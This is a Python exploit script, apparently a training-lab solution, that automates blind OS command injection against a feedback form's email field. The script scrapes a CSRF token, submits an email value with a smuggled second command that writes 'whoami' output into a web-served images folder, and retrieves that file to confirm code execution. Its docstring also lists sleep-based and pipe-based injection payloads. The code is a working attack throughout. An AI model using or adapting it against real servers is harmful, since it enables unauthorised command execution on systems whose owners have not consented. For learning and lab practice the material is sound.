#3 Blind OS command injection with output redirection 
"""
    1. Confirm blind command injection
        & sleep 10 # (for email field)
    2. Check where images are stored
        email=||whoami>/var/www/images/output.txt||
               & whoami>/var/www/images/output.txt #
    3. Redirect output to file 
    4. Check if file was created 

"""
import requests 
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup 

proxies = {'http': 'http://127.0.0.1:8080','https': 'http://127.0.0.1:8080' }
def get_csrf_token(s, url):
    feedback_path = '/feedback'
    r = s.get(url + feedback_path, verify=False, proxies = proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input")['value']
    return csrf
def exploit_command_injection(s, url):
    submit_feedback_path = '/feedback/submit'
    command_injection = 'test@gmail.com  & whoami>/var/www/images/output.txt #'
    csrf_token = get_csrf_token(s, url)
    data = {'csrf': csrf_token, 'name':'test', 'email': command_injection, 'subject':'test', 'message':'test'}
    res = s.post(url + submit_feedback_path, data=data, verify=False, proxies=proxies)
    print("(+) Verifying if command injection exploit worked...")
    # verify  command injection
    file_path = '/image?filename=output.txt'
    res2 = s.get(url + file_path, verify=False, proxies=proxies)
    if (res2.status_code == 200):
        print("(+) Command injection succeeded")
        print("(+) The following is the content of the command " + res2.text)
    else:
        print("(-) Command injection failed")

def main():
    if len(sys.argv) != 2 :
        print ("[+] Usage: %s <url> <payload>" % sys.argv[0])
        print ('[-] Example: %s www.example.com "1=1"' % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    print ("(+) Exploiting blind command injection in email field...")
    s = requests.Session()
    exploit_command_injection(s, url)

if __name__ == '__main__':
    main()
